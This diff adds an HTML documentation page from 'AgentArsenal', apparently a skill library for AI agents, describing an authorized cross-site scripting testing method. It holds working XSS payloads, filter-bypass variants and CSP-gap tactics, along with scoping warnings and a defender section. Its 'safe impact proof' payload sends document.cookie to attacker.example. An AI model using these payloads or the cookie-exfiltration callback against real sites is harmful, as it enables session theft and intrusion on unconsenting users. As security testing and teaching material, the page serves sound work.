@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: web-xss</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>web-xss</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing a web application for cross-site scripting on</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="web-sqli.html">web-sqli</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>OWASP ZAP</td><td>2.16.1</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>Cross-site scripting happens when an application includes untrusted input in its output without proper encoding, so the input runs as code in a victim&#x27;s browser. This skill covers the full authorized methodology: finding where input lands, crafting payloads for the exact output context, bypassing naive filters, and proving impact safely with non-destructive callbacks. Never test against real users or third party visitors, and never exfiltrate real session data outside the agreed scope.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Map every place user input is reflected, stored, or processed by</li>
+<p>JavaScript (forms, URL parameters, headers, file uploads, WebSocket messages).</p>
+<li>Identify the exact output context for each sink: HTML body, tag</li>
+<p>attribute, JavaScript string, URL, or CSS.</p>
+<li>Confirm with a harmless marker first (unique string), then escalate to</li>
+<p>a minimal JavaScript execution proof (<code>alert(document.domain)</code>).</p>
+<li>Craft context-aware payloads; do not throw generic payloads at every</li>
+<p>input.</p>
+<li>Test persistence: stored inputs need the payload to survive the write</li>
+<p>path and fire on every page that renders it.</p>
+<li>For DOM XSS, trace sources (<code>location.hash</code>, <code>postMessage</code>) to sinks</li>
+<p>(<code>innerHTML</code>, <code>document.write</code>, <code>eval</code>).</p>
+<li>Check the Content Security Policy for gaps that allow the payload.</li>
+<li>Prove impact with a callback to your own listener, then stop. Do not</li>
+<p>attack real sessions.</p>
+</ol>
+<h2>1. Finding sinks and contexts</h2>
+<p>Send a unique canary string and search the response for where it appears unencoded.</p>
+<pre><code class="language-bash"># Canary probe on a search parameter
+curl -s &quot;https://target.example/search?q=zzCANARYzz9&quot; | grep -o &#x27;.\{40\}zzCANARYzz9.\{40\}&#x27;
+
+# Check which contexts echo the input (attribute, script, body)
+curl -s -X POST &#x27;https://target.example/profile&#x27; \
+  -d &quot;bio=zzCANARYzz9&quot; -b &quot;session=TEST&quot; | grep -n &#x27;zzCANARYzz9&#x27;</code></pre>
+<pre><code class="language-bash"># Inspect a CSP header before crafting payloads
+curl -sI &#x27;https://target.example/&#x27; | grep -i &#x27;content-security-policy&#x27;
+
+# Also check meta tag CSP in the HTML
+curl -s &#x27;https://target.example/page&#x27; | grep -i &#x27;http-equiv=&quot;Content-Security-Policy&quot;&#x27;</code></pre>
+<p>Record for each sink: the input, the page, the exact surrounding markup, and whether characters like <code>&lt;</code>, <code>&gt;</code>, <code>&quot;</code>, <code>&#x27;</code>, and <code>(</code> survive.</p>
+<h2>2. Reflected XSS</h2>
+<p>The payload fires immediately in the response. Match the payload to the context you found in step 1.</p>
+<pre><code class="language-bash"># HTML body context: tag injection
+curl -s &quot;https://target.example/search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E&quot;
+
+# Double-quoted attribute context: break out of the attribute first
+# &lt;input value=&quot;PAYLOAD&quot;&gt;  -&gt;  &quot;&gt;&lt;svg onload=alert(document.domain)&gt;
+curl -s &quot;https://target.example/search?q=%22%3E%3Csvg%20onload%3Dalert(document.domain)%3E&quot;
+
+# Single-quoted attribute context
+curl -s &quot;https://target.example/search?q=&#x27;%3E%3Csvg%20onload%3Dalert(document.domain)%3E&quot;
+
+# JavaScript string context: var name = &#x27;PAYLOAD&#x27;;
+# close the string, then inject code
+curl -s &quot;https://target.example/welcome?name=x&#x27;;alert(document.domain);//&quot;</code></pre>
+<p>Use event handlers instead of <code>&lt;script&gt;</code> when tags are filtered: <code>&lt;svg onload=...&gt;</code>, <code>&lt;img src=x onerror=...&gt;</code>, <code>&lt;details open ontoggle=...&gt;</code>, <code>&lt;body onload=...&gt;</code> (needs a body-level sink). Prefer payloads without parentheses or quotes when those characters are stripped (see bypasses).</p>
+<h2>3. Stored XSS</h2>
+<p>The payload is saved and fires for anyone who views the stored data. Typical sinks: comments, profiles, support tickets, file names, chat messages, admin dashboards.</p>
+<pre><code class="language-bash"># Store the payload through the normal feature
+curl -s -X POST &#x27;https://target.example/comment&#x27; -b &quot;session=TEST&quot; \
+  --data-urlencode &quot;text=&lt;svg onload=alert(document.domain)&gt;&quot; \
+  -d &quot;post_id=42&quot;
+
+# Verify it renders unencoded on the display page
+curl -s &#x27;https://target.example/post/42&#x27; -b &quot;session=TEST&quot; | grep -o &#x27;&lt;svg[^&gt;]*&gt;&#x27;
+
+# Check secondary render paths: admin panel, exports, email templates
+curl -s &#x27;https://target.example/admin/comments&#x27; -b &quot;session=ADMINTEST&quot;</code></pre>
+<p>Stored XSS in an admin panel is high impact: prove it with a test admin account only, never with a real administrator&#x27;s session.</p>
+<h2>4. DOM-based XSS</h2>
+<p>The vulnerability lives in client side JavaScript. Find sources that read attacker-controlled data and sinks that execute it.</p>
+<pre><code class="language-bash"># Quick source/sink grep over downloaded JavaScript
+curl -s &#x27;https://target.example/static/app.js&#x27; -o /tmp/app.js
+grep -n -E &#x27;location\.(hash|search)|document\.URL|postMessage&#x27; /tmp/app.js
+grep -n -E &#x27;innerHTML|outerHTML|document\.write|eval\(|setTimeout\(|setInterval\(&#x27; /tmp/app.js</code></pre>
+<p>Typical pattern and proof:</p>
+<pre><code class="language-javascript">// Vulnerable: sink reads the hash directly
+document.getElementById(&quot;msg&quot;).innerHTML = location.hash.slice(1);
+
+// Proof URL (fires in the victim&#x27;s browser context):
+// https://target.example/page#&lt;img src=x onerror=alert(document.domain)&gt;</code></pre>
+<p>Also test <code>postMessage</code> handlers that trust <code>event.origin</code> loosely or use <code>&quot;*&quot;</code> in <code>postMessage</code> calls, and check for unsafe <code>JSON.parse</code> flows that feed <code>innerHTML</code>.</p>
+<h2>5. Filter bypass techniques</h2>
+<p>When naive blocklists strip payloads, adapt instead of giving up. Test one bypass at a time.</p>
+<pre><code class="language-bash"># Case variation (filters that are case sensitive)
+curl -s &quot;https://target.example/search?q=%3CsCrIpT%3Ealert(1)%3C/sCrIpT%3E&quot;
+
+# Nested tags (filters that strip once, non-recursively)
+# &lt;scr&lt;script&gt;ipt&gt; becomes &lt;script&gt; after one strip pass
+curl -s &quot;https://target.example/search?q=%3Cscr%3Cscript%3Eipt%3Ealert(1)%3C/scr%3C/script%3Eipt%3E&quot;
+
+# No parentheses: use throw or template tricks
+# &lt;svg onload=alert`1`&gt;  (template literal, no parens needed)
+curl -s &quot;https://target.example/search?q=%3Csvg%20onload%3Dalert%601%60%3E&quot;
+
+# No quotes or angle brackets: event handler with HTML entities
+# &amp;#x3C;svg onload=alert(1)&amp;#x3E; decodes in some attribute contexts
+
+# Protocol bypass for URL contexts: javascript: vs JaVaScRiPt:
+curl -s &quot;https://target.example/go?next=JaVaScRiPt:alert(document.domain)&quot;</code></pre>
+<p>Other useful angles: double URL encoding (<code>%253C</code>), Unicode overlong encoding on weak decoders, and splitting keywords across filter boundaries (<code>&lt;svg/onload=...&gt;</code> with a slash instead of a space). Keep a small local bypass notebook rather than firing thousand-payload lists at the target.</p>
+<h2>6. Content Security Policy considerations</h2>
+<p>Read the policy and look for gaps before assuming a payload is dead.</p>
+<pre><code class="language-bash"># Fetch and read the policy
+curl -sI &#x27;https://target.example/&#x27; | grep -i &#x27;^content-security-policy&#x27;
+
+# Test whether inline scripts are blocked
+curl -s &quot;https://target.example/search?q=%3Cscript%3Ealert(1)%3C/script%3E&quot; -D - -o /dev/null</code></pre>
+<p>Common bypassable patterns: <code>script-src &#x27;self&#x27;</code> with a JSONP endpoint or an uploadable script on the same origin, <code>unsafe-inline</code> anywhere, <code>unsafe-eval</code> combined with a DOM sink, missing <code>object-src</code> (allows Flash era tricks only on legacy setups), and <code>base-uri</code> missing (allows <code>&lt;base&gt;</code> tag hijacking for relative script URLs). If the CSP is strict and nonce-based, XSS may still exist for HTML injection without script execution; report the injection with the CSP as a mitigating factor.</p>
+<h2>7. Safe impact proof</h2>
+<p>Prove execution with a callback to infrastructure you control, and keep the payload non-destructive.</p>
+<pre><code class="language-bash"># Start a listener on your attack host (authorized scope only)
+python3 -m http.server 8443
+
+# Callback payload (fires alert AND phones home to your listener)
+# &lt;svg onload=&quot;fetch(&#x27;https://attacker.example:8443/c?c=&#x27;+document.cookie)&quot;&gt;</code></pre>
+<p>For the report, a screenshot of <code>alert(document.domain)</code> plus the listener log entry is enough. Do not steal real user cookies, do not keylog, and do not chain into account takeover beyond what the rules of engagement allow.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>Input is reflected but fully encoded (<code>&amp;lt;script&amp;gt;</code>). Confirm the</li>
+<p>encoding is consistent everywhere; mixed contexts often encode one sink and miss another.</p>
+<li>Payload fires in your browser but not in curl. DOM XSS needs a real</li>
+<p>browser; use Burp&#x27;s browser or a headless Chromium to confirm.</p>
+<li>Stored payload is stripped on save but fires in exports (CSV, PDF).</li>
+<p>Check every output format, not just the HTML page.</p>
+<li>The application uses a rich text editor (TinyMCE, CKEditor). Test the</li>
+<p>editor&#x27;s own sanitizer config and the server side sanitizer separately; they often disagree.</p>
+<li>Single quotes are escaped but double quotes are not, or vice versa.</li>
+<p>Always test both quote types and no-quote payloads.</p>
+<li>The sink is inside an existing <code>&lt;script&gt;</code> block with JSON encoding.</li>
+<p>Break out with <code>&lt;/script&gt;</code> only if the encoder allows the slash; some encoders strip <code>&lt;</code> but leave <code>&gt;</code> which still permits creative breakouts.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Generic payloads fail: rebuild from the exact surrounding markup you</li>
+<p>recorded in step 1 instead of guessing.</p>
+<li><code>alert</code> is blocked by keyword filter: use <code>prompt</code>, <code>confirm</code>,</li>
+<p><code>print</code>, or <code>throw</code> to prove JavaScript execution.</p>
+<li>Parentheses stripped: use backtick template literals</li>
+<p>(<code>alert</code>1`<code>) or </code>onload=eval(name)` style tricks.</p>
+<li>Event handlers stripped: try <code>&lt;svg&gt;&lt;animate onbegin=...&gt;</code>,</li>
+<p><code>&lt;details open ontoggle=...&gt;</code>, or <code>&lt;iframe srcdoc=...&gt;</code> where allowed.</p>
+<li>CSP blocks inline: hunt for same-origin script gadgets, JSONP</li>
+<p>endpoints, or <code>unsafe-inline</code> in a weaker page on the same origin that shares the session.</p>
+<li>DOM XSS source is <code>postMessage</code>: craft the exact message object the</li>
+<p>handler expects and test origin checks with a page you host.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see XSS probes as requests containing <code>&lt;script</code>, <code>onload=</code>, <code>onerror=</code>, <code>alert(</code>, and encoded variants in parameters, plus reflected canary strings in logs. Stored XSS shows up as script tags in database content and user reports of unexpected popups. A WAF blocks common patterns but misses context-specific and DOM-based vectors. Durable fixes are context-aware output encoding (not one global filter), Content Security Policy with nonces or hashes, <code>HttpOnly</code> and <code>SameSite</code> cookie flags to blunt session theft, and DOM APIs like <code>textContent</code> instead of <code>innerHTML</code>.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1189 (Drive-by Compromise): browser-side execution class.</li>
+<li>MITRE ATT&amp;CK T1539 (Steal Web Session Cookie): the classic XSS impact.</li>
+<li>CWE-79 (Improper Neutralization of Input During Web Page Generation,</li>
+<p>Cross-site Scripting).</p>
+<li>CWE-116 (Improper Encoding or Escaping of Output): the root cause.</li>
+<li>OWASP Testing Guide: Testing for Reflected, Stored, and DOM XSS</li>
+<p>(OTG-CLIENT-001/002/003).</p>
+<li>PortSwigger Web Security Academy: XSS cheat sheet and labs.</li>
+<li>OWASP XSS Prevention Cheat Sheet: context-aware encoding rules.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
